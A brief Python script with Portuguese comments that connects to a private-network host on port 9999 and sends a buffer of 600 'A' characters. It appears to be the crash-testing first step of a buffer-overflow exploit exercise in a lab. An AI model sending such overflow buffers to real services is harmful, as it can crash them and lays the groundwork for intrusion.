#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis

# Importa a biblioteca Socket
import socket
# Cria a conexão com a máquina e se conecta
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('192.168.122.49',9999))
# Envia um buffer de 600 "A"
buffer = b"A" * 600
print("[+] Enviando Buffer de 600 [+]")
client.send(buffer)